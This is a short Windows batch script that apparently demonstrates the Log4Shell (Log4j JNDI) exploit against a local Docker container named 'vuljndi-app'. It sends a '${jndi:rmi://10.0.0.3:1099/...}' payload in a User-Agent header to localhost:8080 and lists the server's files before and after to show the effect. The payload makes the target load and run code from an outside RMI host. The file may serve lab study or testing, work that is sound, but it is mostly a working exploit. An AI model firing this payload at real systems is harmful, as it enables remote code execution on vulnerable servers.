@echo off
setlocal enabledelayedexpansion

cd /d "%~dp0"

echo Starting Docker services...
docker-compose up -d

echo Waiting for services to be ready...
timeout /t 3 /nobreak >nul

set SERVER=vuljndi-app

echo Server home file list:
docker exec %SERVER% dir

echo Sending Injection Code...
set TARGET_URL=http://127.0.0.1:8080
set USER_AGENT=${jndi:rmi://10.0.0.3:1099/t0skrw}
curl -v %TARGET_URL% -H "User-Agent: %USER_AGENT%"

echo Server home file list:
docker exec %SERVER% dir

docker-compose down